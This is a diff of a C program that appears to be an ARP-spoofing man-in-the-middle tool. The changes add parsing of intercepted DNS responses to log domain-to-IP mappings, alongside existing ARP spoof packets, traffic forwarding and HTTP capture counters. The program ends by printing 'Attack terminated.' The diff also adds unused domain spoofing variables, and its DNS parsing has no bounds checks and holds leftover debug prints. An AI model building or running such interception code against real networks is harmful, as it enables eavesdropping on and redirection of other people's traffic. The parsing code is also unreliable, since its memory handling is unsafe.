@@ -14,7 +14,6 @@
 #include <net/ethernet.h>
 #include <netinet/if_ether.h>
 #include <netinet/ether.h>
-#include <linux/if_arp.h>
 #include <pthread.h>
 #include <time.h>
 #include <fcntl.h>
@@ -28,6 +27,15 @@
 #define DNS_ANSWER 1
 #define DNS_TYPE_A 1
 
+#define QR_FLAG     (1 << 15)
+#define OPCODE_MASK (0x7800)
+#define AA_FLAG     (1 << 10)
+#define TC_FLAG     (1 << 9)
+#define RD_FLAG     (1 << 8)
+#define RA_FLAG     (1 << 7)
+#define Z_MASK      (0x0070)
+#define RCODE_MASK  (0x000F)
+
 #define PACKET_BUFFER_SIZE 65535
 #define HTTP_BUFFER_SIZE 8192
 #define MAX_URL_LENGTH 2048
@@ -35,15 +43,14 @@
 #define ARP_REQUEST 1
 #define ARP_REPLY 2
 
-#define PACKET_BUFFER_SIZE 65535
-#define HTTP_BUFFER_SIZE 8192
-#define MAX_URL_LENGTH 2048
-
 volatile int keep_running = 1;
 unsigned long packets_sent = 0;
 unsigned long packets_forwarded = 0;
 unsigned long packets_captured = 0;
 unsigned long http_requests_captured = 0;
+
+unsigned char* domain_name;
+unsigned char* domain_ip;
 
 unsigned char our_mac[6];
 unsigned char target_mac[6];
@@ -78,16 +85,9 @@ typedef struct arp_packet {
 } __attribute__((packed)) arp_packet;
 
 
-// workin on them currently
 typedef struct dns_header {
     unsigned short id;
-    unsigned short qr;
-    unsigned short opcode;
-    unsigned short aa;
-    unsigned short tc;
-    unsigned short rd;
-    unsigned short ra;
-    unsigned short z;
+    unsigned short flags;
     unsigned short rcode;
     unsigned short qdcount;
     unsigned short ancount;
@@ -98,7 +98,6 @@ typedef struct dns_header {
 typedef struct dns_question {
     unsigned short qtype; // shoud be 1 here since we need only A records
     unsigned short qclass;
-    unsigned char* qname; // can be of variable length
 } __attribute__((packed)) dns_question;
 
 typedef struct dns_answer {
@@ -106,14 +105,12 @@ typedef struct dns_answer {
     unsigned short aclass;
     unsigned int ttl;
     unsigned short rdlength;
-    unsigned char *rdata;
-    unsigned char *aname;
 } __attribute__((packed)) dns_answer;
 
 typedef struct dns_packet {
     dns_header header;
     dns_question question;
-   dns_answer answer;
+    dns_answer answer;
 } dns_packet;
 
 void handle_sigint(int sig) {
@@ -124,7 +121,6 @@ void handle_sigint(int sig) {
     printf("HTTP requests captured: %lu\n", http_requests_captured);
     keep_running = 0;
 }
-
 int get_if_mac(const char *ifname, unsigned char *mac) {
     struct ifreq ifr;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -300,6 +296,64 @@ void send_arp_spoof(int sock, const unsigned char *victim_mac, const unsigned ch
     packets_sent++;
 }
 
+char **extract_dns_info(dns_packet *packet) {
+    char **result = malloc(2 * sizeof(char *));
+    if (!result) return NULL;
+    result[0] = malloc(256);              // domain name buffer
+    result[1] = malloc(INET_ADDRSTRLEN);    // IPv4 address buffer
+    if (!result[0] || !result[1]) {
+        free(result[0]);
+        free(result[1]);
+        free(result);
+        return NULL;
+    }
+
+    unsigned char *reader = (unsigned char *)packet;
+    reader += sizeof(dns_header);
+
+    char domain[256];
+    int pos = 0;
+    while (*reader != 0) {
+        int label_len = *reader;
+        reader++;
+        for (int i = 0; i < label_len; i++) {
+            domain[pos++] = *reader++;
+        }
+        domain[pos++] = '.';
+    }
+    domain[pos - 1] = '\0';  // replace last dot with terminating null
+
+    strcpy(result[0], domain);
+
+    // skip the terminator byte and the DNS question section 
+    reader++;
+    reader += sizeof(dns_question);
+
+    // asnwer section
+    if ((*reader & 0xC0) == 0xC0) {
+        reader += 2;
+    } else {
+        while (*reader != 0)
+            reader++;
+        reader++;
+    }
+
+    dns_answer *ans = (dns_answer *)reader;
+    reader += sizeof(dns_answer);
+
+    // chck for A records, atype==1 for it
+    if (ntohs(ans->atype) == 1 && ntohs(ans->aclass) == 1) {
+        struct in_addr ip_addr;
+        // copy ipv4
+        memcpy(&ip_addr, reader, 4);
+        inet_ntop(AF_INET, &ip_addr, result[1], INET_ADDRSTRLEN);
+    } else {
+        strcpy(result[1], "not A record");
+    }
+
+    return result;
+}
+
 void forward_packet(const unsigned char *buffer, int size, const unsigned char *src_mac, const unsigned char *dest_mac) {
     struct sockaddr_ll device;
     ethernet_header *eth = (ethernet_header *)buffer;
@@ -321,6 +375,21 @@ void forward_packet(const unsigned char *buffer, int size, const unsigned char *
     device.sll_ifindex = get_if_index(interface);
     device.sll_halen = ETH_ALEN;
     memcpy(device.sll_addr, dest_mac, 6);
+
+    // struct udphdr *udp = (struct udphdr*)(packet + sizeof(ethernet_header) + sizeof(struct iphdr));
+    // if (ntohs(udp->dest) == DNS_PORT || ntohs(udp->source) == DNS_PORT) {
+    //     dns_packet *dpacket = malloc(sizeof(dns_packet));
+    //     if (!dpacket) {
+    //         perror("malloc");
+    //         free(packet);
+    //         return;
+    //     }
+    //     if ((dpacket->header.flags & QR_FLAG) >> 15) {
+    //         printf("DNS response captured\n");
+    //     memcpy(dpacket, packet + sizeof(ethernet_header) + sizeof(struct iphdr), sizeof(dns_packet));
+    //     printf("DNS packet captured\n");
+    //     free(dpacket);
+    // }
     
     if (sendto(raw_socket, packet, size, 0, 
                (struct sockaddr*)&device, sizeof(device)) < 0) {
@@ -360,7 +429,7 @@ void print_packet_details(const unsigned char *buffer, int size) {
         printf("\n- IP: ");
         printf("Src IP: %s", inet_ntoa(*(struct in_addr*)&ip->saddr));
         printf(" -> Dst IP: %s", inet_ntoa(*(struct in_addr*)&ip->daddr));
-        printf(" (proto: %d)", ip->protocol);
+        // printf(" (proto: %d)", ip->protocol);
         
         if (ip->protocol == IPPROTO_TCP) {
             tcp = (struct tcphdr*)(buffer + eth_header_size + (ip->ihl * 4));
@@ -388,15 +457,38 @@ void print_packet_details(const unsigned char *buffer, int size) {
                 printf(" (FTP)");
             }
         } else if (ip->protocol == IPPROTO_UDP) {
+
             udp = (struct udphdr*)(buffer + eth_header_size + (ip->ihl * 4));
-            
+
             printf("\n- UDP: ");
             printf("Src Port: %d", ntohs(udp->source));
             printf(" -> Dst Port: %d", ntohs(udp->dest));
             
-            if (ntohs(udp->dest) == 53 || ntohs(udp->source) == 53) {
-                printf(" (DNS)");
-                
+            if (ntohs(udp->source) == 53 || ntohs(udp->dest) == 53) {
+                printf("DNS");
+                dns_packet *dpacket = malloc(sizeof(dns_packet));
+                printf("\nyay\n");
+                if (!dpacket) {
+                    perror("malloc");
+                }
+                memcpy(dpacket, (buffer + eth_header_size + (ip->ihl * 4) + sizeof(struct udphdr)), sizeof(dns_packet));
+                printf("memcpy complete\n");
+                printf("%u", (dpacket->header.flags));
+                if ((dpacket->header.flags & QR_FLAG) >> 15 == 1 && dpacket->answer.atype == 1) {
+                    printf("Entering a A record..\n");
+                    char **info = extract_dns_info(dpacket);
+                    printf("Info Extracting complete.\n");
+                    if (info) {
+                        printf("Domain: %s\n", info[0]);
+                        printf("IPv4: %s\n", info[1]);
+                        free(info[0]);
+                        free(info[1]);
+                        free(info);
+                    } else {
+                        printf("error: info invalid!\n");
+                    }
+                }
+
             } else if (ntohs(udp->dest) == 67 || ntohs(udp->dest) == 68) {
                 printf(" (DHCP)");
             }
@@ -602,6 +694,5 @@ int main(int argc, char *argv[]) {
     clean_up(target_mac, gateway_mac);
     close(raw_socket);
     printf("Attack terminated.\n");
-    
     return 0;
 }
